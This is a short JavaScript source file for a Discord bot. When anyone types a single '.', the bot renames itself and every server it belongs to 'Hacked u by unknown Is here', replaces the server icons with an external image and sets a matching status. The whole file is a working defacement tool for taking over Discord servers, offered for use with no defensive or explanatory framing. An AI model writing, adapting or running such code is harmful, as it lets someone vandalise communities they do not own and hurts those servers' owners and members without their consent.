const Discord = require('discord.js');
const fs = require ('fs');
const client = new Discord.Client(); 
const prefix = "/"
console.log('BOT IS ONLINE !')



client.on('message', message => {
     if (message.content === ".") {
client.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
}
});
client.on('message', message => {
     if (message.content === ".") {
client.user.setUsername("Hacked u by unknown Is here")
 
}
});
client.on('message', message => {
     if (message.content === ".") {
client.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
 
}
});
 
client.on('message', message => {
     if (message.content === ".") {
         client.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
})
}
});
client.on('message', message => {
     if (message.content === ".") {
         client.guilds.forEach(m =>{
             m.setName(`Hacked u by unknown Is here`)
})
}
});
 
client.on('message', message => {
     if (message.content === ".") {
                 if(!message.channel.guild) return;
 
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
}
});
 


client.login(process.env.BOT_TOKEN);
